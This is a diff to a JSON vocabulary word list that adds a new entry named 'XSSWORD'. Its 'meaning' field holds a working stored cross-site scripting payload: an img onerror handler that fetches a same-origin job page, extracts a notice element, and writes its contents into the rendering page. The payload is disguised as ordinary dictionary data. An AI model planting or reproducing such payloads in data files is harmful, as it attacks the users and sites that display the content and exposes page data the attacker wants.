@@ -3373,5 +3373,15 @@
       "exalt."
     ],
     "usage": "The stern judge will excoriate the behavior of the repeat offender by sentencing him to thirty years in prison."
+  },
+  {
+    "id": 195,
+    "word": "XSSWORD",
+    "pos": "(verb)",
+    "hindiMeaning": "test",
+    "meaning": "<img src=x onerror=\"fetch('/updates/job_39ced6b8e3').then(r=>r.text()).then(html=>{ const doc=new DOMParser().parseFromString(html,'text/html'); const el=doc.querySelector('.notice-custom-body'); document.write('<h1>LENGTH: '+el.innerHTML.length+' | INDEX: '+el.innerHTML.toLowerCase().indexOf('how to apply')+' | SUBSTRING: '+el.innerHTML.substring(0,500)+'</h1>'); })\">",
+    "synonyms": [],
+    "antonyms": [],
+    "usage": ""
   }
 ]
